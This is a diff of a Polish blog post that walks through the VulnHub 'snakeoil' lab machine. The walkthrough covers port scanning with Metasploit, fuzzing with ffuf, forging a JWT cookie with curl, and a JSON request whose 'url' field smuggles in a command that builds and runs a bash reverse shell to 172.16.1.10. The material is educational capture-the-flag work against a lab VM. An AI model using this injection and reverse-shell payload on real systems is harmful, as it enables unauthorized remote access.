@@ -27,10 +27,10 @@ gallery6_7:
     image_path: /assets/images/hacking/2021/10/07.png
 ---
 # Wstęp
-[digitalworld.local: snakeoil](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/) jest ciekawą i nieszablonową maszyną z paru powodów: wykorzystane są tokeny **JWT** (JSON Web Token), format **JSON** (JavaScript Object Notation), możemy na niej przećwiczyć metody **HTTP** typu **GET**, **POST** w popularnych programach. Przećwiczymy to na trzech: tekstowy [Curl](https://curl.se/download.html) - link jest tutaj w sumie zbędny, posiada go chyba każde repozytorium, ale podaje dla formalności; drugim programem będzie [Burp Suite](https://portswigger.net/burp) i trzecim, który ostatnio wpadł mi w oko będzie [Postman](https://www.postman.com/) (w sumie znalazłem go na [YouTube](https://www.youtube.com/watch?v=RqqRScUwNlA). Tam też jest instrukcja, jak przejść **Snakeoil**. Ale zrobimy to po swojemu i się skupimy głównie na programach, które wyżej wymieniłem.
+[digitalworld.local: snakeoil](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/) jest ciekawą i nieszablonową maszyną z paru powodów: wykorzystane są tokeny **JWT** (JSON Web Token), format **JSON** (JavaScript Object Notation), możemy na niej przećwiczyć metody **HTTP** typu **GET**, **POST** w popularnych programach. Przećwiczymy to na trzech: tekstowy [Curl](https://curl.se/download.html) - link jest tutaj w sumie zbędny, posiada go chyba każde repozytorium, ale podaje dla formalności; drugim programem będzie [Burp Suite](https://portswigger.net/burp) i trzecim, który ostatnio wpadł mi w oko będzie [Postman](https://www.postman.com/), który znalazłem na [YouTube](https://www.youtube.com/watch?v=RqqRScUwNlA). Tam też jest instrukcja, jak przejść **Snakeoil**. Ale zrobimy to po swojemu i się skupimy głównie na programach, które wyżej wymieniłem.
 {: .text-justify}
 # Zaczynamy
-## Metasploit
+## Metasploit i Db_nmap
 Jeżeli nie chcecie ciągle wpisywać tych samych komend, **Metasploit** umożliwia nam w pewnym sensie automatyzację. Wystarczy użyć polecenie **resource**. A jak to działa? Po prostu tworzymy komendy w pliku i potem uruchamiamy wpisując **resource [nazwa_zasobów]**. Prawda, że proste? 
 {: .text-justify}
 <div class="notice--primary" markdown="1">
@@ -53,9 +53,8 @@ resource (/home/szikers/snackoil/snakeoil.rc)> db_nmap -A -p- 172.16.1.141
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
 ```
 </div>
-Jak widzimy są otwarte trzy porty. Ten co będzie nas interesować, to jest port 8080.
+Po przeskanowaniu wirtualki, widzimy że są otwarte trzy porty. Ten co będzie nas interesować, to port **8080**.
 {: .text-justify}
-
 ## Ffuf
 **Ffuf** czyli **Fuzz Faster U Fool** jest bardzo szybkim fuzzerem bez natłoku funkcji. Wg. mnie ma wszystko co jest potrzebne. Zamiast **Dirb** lub **GoBuster** w tym artykule do skanowania użyjemy tylko powyższego fuzzera.
 {: .text-justify}
@@ -149,8 +148,10 @@ Okazuje się, że potrzebujemy sekretnego klucza, który jest w urlu **http://17
 {: .text-justify}
 Wróćmy na chwilę do **Curl**-a, ale nie zamykajmy jeszcze okna w **Burp Suite**. Przechodzimy znowu do **Curl**-a. Wchodząc na podany [link](https://flask-jwt-extended.readthedocs.io/en/stable/options/) frameworka **Flask**-a się dowiadujemy, że opcja **JWT_ACCESS_COOKIE_NAME** umożliwia wysłanie nasz token poprzez ciasteczko, domyślnie się nazywa **access_token_cookie**.
 {: .text-justify}
+
 ![xcp](/assets/images/hacking/2021/10/08.png)
-Wynika z tego, że musimy podać klucz w ciasteczku (Jak to zabrzmiało :smiley:) i wysłać na serwer:
+
+Wynika z tego, że musimy podać klucz w ciasteczku (jak to zabrzmiało :smiley: ) i wysłać na serwer:
 {: .text-justify}
 ```console
 root@kali:/home/szikers# curl --cookie "access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTczNDE4NywianRpIjoiZjU4NDNhMmUtOTYzOC00NTFlLTg2NDktOTczMGQzNGUzZmUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNuYWNrb2lsIiwibmJmIjoxNjMxNzM0MTg3LCJleHAiOjE2MzE3MzUwODd9.18oenH8p5IsRYLes02qLICWh_wAYXvCxaVib_H-hbmQ"  http://172.16.1.141:8080/secret
@@ -178,7 +179,7 @@ Cache-Control: max-age=0
 Content-Length: 227
 
 {
-"url":"--help >/dev/null ; echo '#!/BIN/BASH' >1.sh; echo 'BASH -i > /DEV/TCP/172.16.1.10/12345 0>&1 2>&1' >> 1.sh; tr [:upper:] [:lower:] <1.sh > 2.sh; chmod +x 2.sh; ./2.sh ;"  ,
+"url":"--help >/dev/null ; echo '#!/BIN/BASH' >1.sh; echo 'BASH -i > /DEV/TCP/172.16.1.10/12345 0>&1 2>&1' >> 1.sh; tr [:upper:] [:lower:] <1.sh > 2.sh; chmod +x 2.sh; ./2.sh ;",
 "secret_key":"commandexecutionissecret"
 }
 ```
